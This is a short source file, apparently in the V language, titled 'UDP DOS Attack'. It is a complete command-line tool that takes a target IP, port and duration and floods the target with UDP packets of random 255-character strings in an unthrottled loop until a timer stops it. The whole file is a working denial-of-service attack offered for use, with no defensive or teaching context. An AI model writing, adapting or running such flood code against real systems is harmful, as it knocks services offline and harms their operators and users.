/*
@title: UDP DOS Attack
@author: vZy
@since: 1/14/23
*/
import os
import net
import time
import rand

fn main() 
{
	args := os.args.clone()
	if args.len < 4 {
		print("[ X ] Error, Invalid argument provided\r\nUsage: ./${args[0]} <ip> <port> <time>")
		exit(0)
	}

	go timer(args[3].int())
	
	print("Attacking ${args[1]}:${args[2]} for ${args[3]} seconds.....")
	for
	{
		req(args[1], args[2])
	}
	print("Attack Done.....")
}

fn timer(max int) {
	time.sleep(time.second*max)
	exit(0)
}

/*
	This function will only make a single request to an IP
*/
fn req(ip string, port string)
{
	mut c := net.dial_udp("${ip}:${port}") or { return }
	c.write_string(randomize_str(255)) or { 0 }
	c.close() or { return }
}

fn randomize_str(hex_sz int) string
{
	mut new_hex := ""
	chars := "qwertyuiopasdfghjklzxcvbnm1234567890-=`[]\;',./<>?L:\"{}|_+~".split("")
	for _ in 0..hex_sz
	{
		num := rand.int_in_range(0, chars.len) or { 0 }
		new_hex += chars[num]
	}
	return new_hex
}